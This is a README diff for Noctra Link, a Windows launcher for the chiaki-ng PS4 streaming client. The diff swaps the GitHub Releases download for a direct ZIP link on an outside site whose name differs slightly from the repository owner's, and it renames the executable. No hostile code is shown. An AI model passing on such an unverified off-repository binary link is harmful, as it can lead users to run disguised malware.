@@ -14,7 +14,7 @@ Noctra Link is a small Windows launcher and setup companion for **chiaki-ng**. I
 
 ## Download and run
 
-Open this repository's **[Releases](https://github.com/Soiltary/Noctra/releases)** page and download **Noctra-Link-v1.1.0-Windows-x64.zip**. Extract the **entire** archive into a writable folder, then run **NoctraLink.exe**. On first use, the launcher offers a one-time verified engine download (about 97 MB). Keep the setup window open until it finishes.
+Download the current **[Windows ZIP](https://noctra-link.soltairy.chatgpt.site/downloads/Noctra-Windows-x64-v1.1.0.zip)** from the Noctra website. Extract the **entire** archive into a writable folder, then run **Noctra.exe** in the website package (or **NoctraLink.exe** in a repository build). On first use, the launcher offers a one-time verified engine download (about 97 MB). Keep the setup window open until it finishes.
 
 1. Click **Open streaming client**.
 2. Pair your PS4 in chiaki-ng on first use.
